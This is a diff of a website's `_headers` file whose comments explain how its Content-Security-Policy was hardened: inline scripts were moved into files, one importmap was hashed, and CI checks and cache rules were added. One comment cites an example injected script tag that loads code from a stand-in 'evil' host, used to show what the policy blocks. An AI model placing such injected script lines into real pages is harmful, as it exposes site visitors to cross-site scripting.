@@ -13,39 +13,69 @@
 # a self-hoster's broker was never reachable from a Pages deployment anyway.
 #
 # WHAT IS DELIBERATELY *NOT* HERE, and this is not an oversight. §4.7 sketches
-# `default-src 'self'` — but `script-src` and `style-src` fall back to `default-src`, and
-# this site has inline <script> blocks (sim.html, docs.html, index.html), an inline
-# importmap, inline `onclick=` handlers (docs.html, cloud.html) and inline `style=`
-# attributes. `default-src 'self'` with no `'unsafe-inline'` would therefore BREAK the
-# docs explorer and the HUD glue — and §4.7's own instruction is "do not ship a CSP that
-# breaks the site to look thorough". The directives below are the subset that is
+# `default-src 'self'`, and that is now what ships for scripts. `style-src` still carries
+# `'unsafe-inline'`: every page has a `<style>` block and inline `style=` attributes, and
+# the JS animates `el.style.transform` on a rAF loop, which no hash can cover. That is the
+# residual gap, and it is a far smaller one — a `style-src` hole cannot load or run code,
+# only restyle what is already on the page. The rest of the policy is the subset that is
 # verifiably safe for this bundle: no page uses <base>, <object>/<embed> or any iframe,
 # and no page loads a subresource from another origin (only anchor hrefs and the canonical
-# links point off-site). The nonce/hash pass that lets `script-src 'self'` land is P1, and
-# it must be verified on a preview deploy before it ships.
+# links point off-site).
 #
-# 2026-09-03 — WHAT THIS PASS ADDED, and the one thing it deliberately did not.
+# 2026-09-03 — WHAT THAT PASS ADDED.
 #
 # ADDED `script-src 'self' 'unsafe-inline'` (and `default-src 'self'` behind it). The
 # policy above had NO `script-src` and NO `default-src`, so script execution was entirely
 # unrestricted: an injected `<script src="https://evil/x.js">` would have run. It cannot
 # now — combined with `connect-src 'self'` (which already has a measured kill on this site:
 # it is what refused the port-8081 fetch), the loader AND the exfiltration halves of the
-# usual XSS payload are both closed.
+# usual XSS payload are both closed. It left `'unsafe-inline'` standing, and called that
+# the honest gap. The paragraph below is what closing it actually took.
 #
-# NOT REMOVED: `'unsafe-inline'` for scripts. That is the honest gap, and the blocker is
-# specific rather than vague. `_headers` is a STATIC file, so a per-response nonce is
-# impossible — the only route to `script-src 'self'` is SHA-256 hashes for every inline
-# block, and this bundle has FOURTEEN of them across five pages (sim.html 4,
-# index/setup/cloud 3 each, docs.html 1 — four of those fourteen are `type="importmap"`)
-# AND TEN inline event-handler attributes (docs.html 9, cloud.html 1), which need
-# `'unsafe-hashes'` plus a hash per handler. Counted, not estimated.
-# Shipping that means a build step that regenerates the hashes plus a CI freshness guard,
-# because a hash that drifts from its block does not degrade — it BLANKS THE PAGE, and no
-# test in this repo would see it (the browser suites serve from `sim/serve.py`, which sends
-# no `_headers` at all). `sim/test_csp.mjs` closes exactly that hole for the policy we DO
-# ship: it serves the site with these headers applied and asserts every page loads with no
-# violation. Moving the inline blocks into files is the real fix and is a separate slice.
+# 2026-09-04 — `'unsafe-inline'` IS GONE FROM `script-src`. Counted, not estimated.
+#
+# The count that blocked this was FOURTEEN inline `<script>` blocks across five pages
+# (sim.html 4, index/setup/cloud 3 each, docs.html 1 — four of them `type="importmap"`).
+# THIRTEEN WERE DELETED RATHER THAN HASHED, because a file that does not exist cannot
+# drift:
+#
+#   · the seven ordinary blocks became seven files — `sw-reset.js`, `hud.js`, `rail.js`
+#     (sim.html), `home.js` (index), `setup.js`, `cloud.js`, `docs.js`. Each `<script src>`
+#     sits in the exact document position its inline block held and carries no
+#     defer/async, so execution order is unchanged;
+#   · the three `<script type="module">` wire-background blocks differed only in an opacity
+#     number, so the number moved to `data-opacity` on the `#wire-bg` element (markup, which
+#     CSP does not police) and the three blocks became one `wire-bg.js`;
+#   · THREE OF THE FOUR IMPORTMAPS WERE DELETED OUTRIGHT. index/setup/cloud carried one
+#     solely to resolve the bare specifier in `moxie-wire.js`'s `import … from "three"`.
+#     That import now names `./vendor/three/three.module.js` and the maps are gone.
+#
+# ONE inline block remains and it is HASHED: `sim.html`'s `<script type="importmap">`.
+# It cannot become a file — `<script type="importmap" src>` was dropped from the spec and
+# no browser ships it — and sim.html genuinely needs a map where the other four pages did
+# not, because `moxie.js` imports `three/addons/…` and the two VENDORED addon files import
+# bare `"three"` themselves. Patching those two vendored files would have taken the count
+# to zero; it was rejected, because a future re-vendor of three.js would quietly restore
+# the bare specifier and the trap would simply have moved somewhere with no guard on it.
+#
+# `'unsafe-hashes'` IS NOT HERE AND IS NOT NEEDED, and the earlier note in this file was
+# WRONG about why. It claimed TEN inline event-handler attributes (docs.html 9,
+# cloud.html 1). There are ZERO. All ten hits are `el.onclick = function(){…}` — a function
+# OBJECT assigned to a DOM property from inside an already-running script, which is not an
+# inline script and which CSP has no opinion about. What CSP does refuse is the ATTRIBUTE
+# form `<button onclick="f()">`, `setAttribute("onclick", …)` and `javascript:` URLs; this
+# bundle has none of the three, and `build_csp_hashes.py` fails the build if one appears —
+# because such a handler would not error, it would simply never fire.
+#
+# THE HASH IS GENERATED, NEVER TYPED. `sim/tools/build_csp_hashes.py` rewrites the
+# `script-src` above from the pages on disk; `--check` proves the committed header still
+# matches them, and `sim/tests/test_csp_hashes.py` runs that check in CI on every push.
+# This is not ceremony: a hash that drifts from its block does not degrade, it BLANKS THE
+# PAGE, and it blanks it in production — until 2026-09-03 no suite in this repo served
+# `_headers` at all, so nothing local would have seen it. `sim/test_csp.mjs` now loads all
+# five pages under this exact policy, asserts ZERO `securitypolicyviolation` events, and
+# drives the docs search, a typed SIM turn and the QR card to prove the pages still WORK
+# rather than merely render.
 #
 # 2026-09-03 (SECOND PASS) — `script-src` ALSO ALLOWS `https://static.cloudflareinsights.com`.
 #
@@ -101,7 +131,7 @@
   Referrer-Policy: strict-origin-when-cross-origin
   Permissions-Policy: microphone=(self), camera=(), geolocation=()
   Strict-Transport-Security: max-age=31536000; includeSubDomains
-  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; font-src 'self'; connect-src 'self'; img-src 'self' data: blob:; media-src 'self' data: blob:; worker-src 'self' blob:; frame-src 'none'; frame-ancestors 'none'; form-action 'none'; base-uri 'none'; object-src 'none'
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'sha256-D2XnioWKWXcIE2epN670TChceWuJD92o/6GT7rIBAsw=' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline'; font-src 'self'; connect-src 'self'; img-src 'self' data: blob:; media-src 'self' data: blob:; worker-src 'self' blob:; frame-src 'none'; frame-ancestors 'none'; form-action 'none'; base-uri 'none'; object-src 'none'
 
 # HTML — always revalidate so a redeploy's new asset references show up immediately.
 /
@@ -110,7 +140,11 @@
   Cache-Control: no-cache
 
 # App scripts — change often; must revalidate (the /*.js glob is unreliable on
-# Pages, so each app script is listed explicitly).
+# Pages, so each app script is listed explicitly. THE LIST IS THE WHOLE MECHANISM: an app
+# script missing from it is served with Pages' default caching, so a redeploy can leave a
+# visitor running yesterday's file against today's HTML. The eight files below marked NEW
+# 2026-09-04 are the inline blocks this bundle used to carry — see the note at the top —
+# and `life.js`/`cloud-transport.js` had simply been missed when they were added.)
 /moxie.js
   Cache-Control: no-cache
 /bridge.js
@@ -132,6 +166,26 @@
 /env.js
   Cache-Control: no-cache
 /mode.js
+  Cache-Control: no-cache
+/life.js
+  Cache-Control: no-cache
+/cloud-transport.js
+  Cache-Control: no-cache
+/sw-reset.js
+  Cache-Control: no-cache
+/hud.js
+  Cache-Control: no-cache
+/rail.js
+  Cache-Control: no-cache
+/home.js
+  Cache-Control: no-cache
+/setup.js
+  Cache-Control: no-cache
+/cloud.js
+  Cache-Control: no-cache
+/docs.js
+  Cache-Control: no-cache
+/wire-bg.js
   Cache-Control: no-cache
 
 # Rendered imagery + docs bundle — short cache so overwrites propagate fast.
